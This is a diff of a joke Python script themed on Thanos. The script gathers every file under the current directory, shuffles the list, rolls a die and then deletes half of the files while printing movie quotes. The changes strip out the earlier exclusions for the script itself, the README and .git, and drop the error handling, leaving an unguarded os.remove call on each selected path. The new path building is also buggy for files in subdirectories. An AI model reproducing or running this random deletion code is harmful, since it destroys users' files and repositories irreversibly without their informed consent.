@@ -1,16 +1,24 @@
+import json
 import os
 import random
 from time import sleep
+from pathlib import Path
+from pprint import pprint
 
 files = []
 
+walkRoot = os.walk(os.curdir)
+
+# pprint(type(walkRoot))
+for item in walkRoot:
+    for file in item[2]:
+        trueFile = os.path.abspath(file)
+        files.append(trueFile)
+
+pprint(files)
 
 
-for root, dirs, file in os.walk(os.getcwd()):
-    if file == "Thanos.py"  or file == "README" or dirs == "Thanos.py" or dirs == ".git":
-        continue
-    files.append(file)
-    files.append(dirs)
+
 
 
 random.shuffle(files)
@@ -38,32 +46,10 @@ else:
     print("*** You rolled a", roll, "***")
     sleep(3)
     print("Fun isn't something one considers when balancing the universe. But this... Does put a smile on my face")
+   
+
     for file in halfFiles:
-        if not isinstance(file, list):
-            try:
-                if os.path.isfile(file):
-                    os.remove(file)
-            except Exception as e:
-                print(e)
-        else:
-            for item in file:
-                if not isinstance(item, list):
-                    try:
-                        if os.path.isfile(item):
-                            os.remove(item)
-                    except Exception as e:
-                        print(e)
-                else:
-                    for subItem in item:
-                        if not isinstance(subItem, list):
-                            try:
-                                if os.path.isfile(subItem):
-                                    os.remove(subItem)
-                            except Exception as e:
-                                print(e)
-                        else:
-                            print("you have to keep going man!!")
-      
+        os.remove(file)        
     sleep(4.5)
     print("Perfectly balanced, as all things should be.")
 
